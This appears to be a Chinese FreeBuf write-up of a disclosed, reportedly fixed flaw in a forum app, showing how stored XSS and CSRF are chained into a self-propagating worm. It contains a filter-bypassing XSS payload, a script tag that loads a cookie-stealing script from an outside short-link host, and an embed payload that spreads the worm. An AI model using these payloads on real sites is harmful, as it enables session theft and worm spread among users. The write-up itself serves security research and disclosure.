***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文原创作者：莫妮卡k37，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

## 大体思路  

1.在发帖的内容处发现了存储型XSS

2.对帖子(母贴)的内容进行构造，插入CSRF POC，并对其中内容输出为302永久重定向到母感染贴

3.所有浏览此页面的用户都会自动发布一个重定向到母感染贴的子贴，重定向到母贴时又再次执行母贴中的POC再次创建一个子贴。

> 以上就是XSS+CSRF构造蠕虫大体的思路，下面细化各个步骤的过程，水平不高，适合XSS初学者的进阶。

## 一、存储型XSS

1.进入发帖处，添加初步测试payload，并查看源码：

![2.jpg](https://image.3001.net/images/20181205/1543975036_5c07307cab65a.jpg!small)

2.观察到可以大小写混淆绕过，于是构造payload（对于屏蔽括号的可以用 ’ 来代替）：

    
    
    <sCrIpt>alert'xss'</sCrIpt>

![3.jpg](https://image.3001.net/images/20181205/1543975074_5c0730a24f2a9.jpg!small)

3.刷新页面观察效果，成功弹窗：

![4.jpg](https://image.3001.net/images/20181205/1543975084_5c0730ac8dbd1.jpg!small)

4.插入JS脚本，利用XSS平台窃取用户cookie，这是最常用的XSS利用手法。

### POC：

    
    
    <sCRiPt/SrC=//60.wf/m5VP>

> SRC引用的是短地址，内容为窃取用户cookie的JS脚本，详细可以使用XSS平台自动生成：

![5.jpg](https://image.3001.net/images/20181205/1543975109_5c0730c57a49e.jpg!small)

## 二、XSS配合CSRF的初步测验

1.首先验证是否存在CSRF，同样在发布新贴处，填写标题内容，点击发布抓包：

![6.jpg](https://image.3001.net/images/20181205/1543975125_5c0730d57ec03.jpg!small)

2.burp自带的生成CSRF POC，POST包处-》右键-》generate csrf poc
-》保存-》使用另一个账号发送POC，查看自己的帖子，发现成功发送新帖。

3.编写JS脚本(可以利用Xss’or来生成)

![7.jpg](https://image.3001.net/images/20181205/1543975134_5c0730de94cec.jpg!small)

4.CSRF+存储型XSS将脚本插入到页面中：

![8.jpg](https://image.3001.net/images/20181205/1543975141_5c0730e5c65c0.jpg!small)

如图，内容为发布新帖的JS脚本，点击发布，就生成了新帖。

5.浏览此贴，提示成功：

![9.jpg](https://image.3001.net/images/20181205/1543975152_5c0730f010206.jpg!small)

6.可以看到成功发布出去：

![10.jpg](https://image.3001.net/images/20181205/1543975178_5c07310ab9c43.jpg!small)

7.使用其他用户浏览帖子测试----发现同样不知觉的发了个新帖，至此，XSS+CSRF的攻击已经完成：

![11.jpg](https://image.3001.net/images/20181205/1543975183_5c07310fd3305.jpg!small)

## 三、蠕虫的构造

再整理一下思路。

蠕虫的前提是子贴的内容，即点击我们母感染贴的用户所发布的子贴的内容是可控的：

    
    
    1.攻击者创建一个攻击帖（母帖），贴中JS脚本包含：  
    ​  
      ①创建一个子回传帖  
    ​  
      ②子回传帖的内容是重定向到母帖  
    ​  
    2.用户浏览母帖，然后自动创建一个子回传帖；  
      
    3.子回传帖403重定向到母帖；  
    ​  
    4.根据内容又创建一个子回传帖；  
    ​  
    5.用户之间互相浏览，发散，传播，不拉不拉不拉，造成蠕虫攻击。

1.任意发表新帖：

![14.jpg](https://image.3001.net/images/20181205/1543975211_5c07312b36837.jpg!small)

2.记录帖子的URL并点击编辑：

![15.jpg](https://image.3001.net/images/20181205/1543975231_5c07313f03118.jpg!small)

3.插入JS脚本，其中控制子回传贴302重定向到母贴的URL。

### payload：

    
    
    <embed/src=/bang.duia.com/web/normal/topic/806440>

意为在页面中插入一个新页面，这个新页面为母贴。  
![13.jpg](https://image.3001.net/images/20181205/1543975273_5c073169d9657.jpg!small)

4.发布后浏览，已生成子回传贴：

![16.jpg](https://image.3001.net/images/20181205/1543975293_5c07317d136e1.jpg!small)

5.打开子回传贴，发现了在母贴JS脚本中构造的框架：

![17.jpg](https://image.3001.net/images/20181205/1543975296_5c0731808d19a.jpg!small)

6.但是在FireFox却很遗憾没有成功，打开Network发现了这样一个提示。意为无效的CORS（跨域资源共享）请求。猜测此处应该是属于白名单拦截，限制了JS的入口：

![18.jpg](https://image.3001.net/images/20181205/1543975305_5c073189045af.jpg!small)

7.通过IE可以运行：

![19.jpg](https://image.3001.net/images/20181205/1543975310_5c07318e3b0a2.jpg!small)![20.jpg](https://image.3001.net/images/20181205/1543975312_5c0731902e60d.jpg!small)

8.重点！！这些都不是最重要的，因为这是一个APP，所以用户基本上是依赖手机端来运行。之后在手机端上查看帖子成功通过子回传URL重定向到母贴并创建了一个新的子回传贴。虽然网站可能有WAF，电脑端IE可以蠕起来，但是发现，app端没有做任何防护，直接可以传播。

![21.png](https://image.3001.net/images/20181205/1543975318_5c0731962f12e.png!small)![22.png](https://image.3001.net/images/20181205/1543975320_5c0731986deb5.png!small)
***本文原创作者：莫妮卡k37，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

